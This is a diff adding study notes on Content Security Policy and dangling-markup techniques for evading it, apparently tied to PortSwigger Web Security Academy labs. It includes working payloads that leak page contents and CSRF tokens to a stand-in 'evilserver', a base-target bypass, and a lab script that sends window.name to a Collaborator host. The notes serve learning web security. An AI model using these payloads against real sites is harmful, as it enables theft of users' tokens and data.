@@ -626,6 +626,108 @@ location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%2
 
 
 
+                                                        ## Content security policy
+                                                        
+# Content security policy (CSP) is a browser mechanism that aims to mitigate the impact of cross-site scripting and some other vulnerabilities
+# If an application that employs CSP contains XSS-like behavior, then the CSP might hinder or prevent exploitation of the vulnerability.
+# Often, the CSP can be circumvented to enable exploitation of the underlying vulnerability. 
+
+                                                      ## What is CSP (content security policy)?
+                                                      
+# CSP is a browser security mechanism that aims to mitigate XSS and some other attacks. It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages. 
+# To enable CSP, a response needs to include an HTTP response header called Content-Security-Policy with a value containing the policy.
+# The policy itself consists of one or more directives, separated by semicolons.
+
+                                                  
+                                                      ## Mitigating XSS attacks using CSP
+                                                      
+# The following directive will only allow scripts to be loaded from the same origin as the page itself: 
+---> script-src 'self'
+
+#  The following directive will only allow scripts to be loaded from a specific domain: 
+----> script-src https://scripts.normal-website.com
+
+# Some browsers, such as Chrome, have built-in dangling markup mitigation that will block requests containing certain characters, such as raw, unencoded new lines or angle brackets. 
+
+
+                                                  ## Evading CSP with DOM-based dangling markup
+                                                  
+# Dangling markup is a technique to steal the contents of the page without script by using resources such as images to send the data to a remote location that an attacker controls.
+# It is useful when reflected XSS doesn't work or is blocked by Content Security Policy (CSP). 
+# The idea is you inject some partial HTML that is in an unfinished state such as a src attribute of an image tag, and the rest of the markup on the page closes the attribute but also sends the data in-between to the remote server. 
+# For example let's say we have an injection point above a script and a form like this:
+
+                        INJECTION HERE <b>test</b>
+                        <script>
+                        token = 'supersecret';
+                        </script>
+                        <form action="blah"></form>
+                        
+# If we inject an image tag with an open src attribute like so:
+
+                        <img src="https://evilserver/?
+                        
+# The code between the injection point and the next double quote will be then sent to the remote server.
+# This might include something sensitive like a CSRF token.
+# Here's what it looks like with the injection. I've highlighted what is sent to the server:
+
+                    <img src="https://evilserver/?<b>test</b>
+                    <script>
+                    token = 'supersecret';
+                    </script>
+                    <form action="blah"></form>
+                    
+# Bypassing a restrictive CSP with base target
+
+# CSP allows a developer to block external resources from being loaded to prevent this sort of attack.
+# However, I've found a new technique that will work even with a really restrictive CSP such as:
+
+Payload: default-src 'none'; base-uri 'none';
+
+# The above CSP will block the image vector with the open src attribute because the policy will not load any image resources or other sub resources.
+# However we can use a base tag to bypass this restriction
+
+Payload: <a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="blah
+
+
+Lab: Reflected XSS protected by very strict CSP, with dangling markup attack
+
+Payload: 
+
+<script>
+if(window.name) {
+	new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
+	} else {
+		location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+
 
                           
                           
